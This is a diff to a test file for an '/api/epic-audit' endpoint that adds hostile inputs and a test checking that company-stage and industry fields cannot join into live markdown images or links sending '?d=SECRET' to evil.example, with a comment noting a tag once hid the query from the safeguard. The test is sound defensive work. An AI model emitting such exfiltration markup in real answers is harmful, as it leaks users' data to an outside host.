@@ -31,6 +31,8 @@ const HOSTILE = {
   query: "see https://evil.example/p?d=SECRET",
   // A space keeps the link and its query apart in what the user typed; the id made from the company name must not join them again.
   split_query: "see https://evil.example/p ?d=SECRET",
+  // A tag between an address and its query hid the query from the safeguard, and the tag then became ‹b› (run 30D auditor 2).
+  tag_query: "x https://evil.example/p<b>?d=SECRET",
 };
 const LIVE = [
   [/!\[[^\]]*\]\(\s*(?:https?:)?\/\//i, "an image to an outside address"],
@@ -51,6 +53,17 @@ for (const [field, make] of FIELDS) {
     }
   });
 }
+
+// Two fields that are harmless alone must not join into live markup in the sentence that repeats them (run 30D auditor 2).
+test("/api/epic-audit: stage and industry cannot join into an image or a link with a query", async () => {
+  for (const [stage, industry] of [['![x](https://evil.example/c "a', 'b"'], ["[c](https://evil.example/p", "?d=SECRET)"], ["see https://evil.example/p", "?d=SECRET"]]) {
+    for (const body of [{ ...VALID, company_stage: stage, industry }, { company: VALID.company, business_stage: stage, industry }]) {
+      const r = await audit(body);
+      assert.equal(r.status, 200);
+      for (const [re, what] of LIVE) assert.doesNotMatch(r.text, re, `${JSON.stringify(body)}: the answer holds ${what}`);
+    }
+  }
+});
 
 test("/api/epic-audit: ordinary text is repeated exactly as typed", async () => {
   const j = JSON.parse((await audit({ ...VALID, company_id: "regional-logistics-1", industry: "Logistics & supply chain < 5 days", company_stage: "Series A, 40 people" })).text);
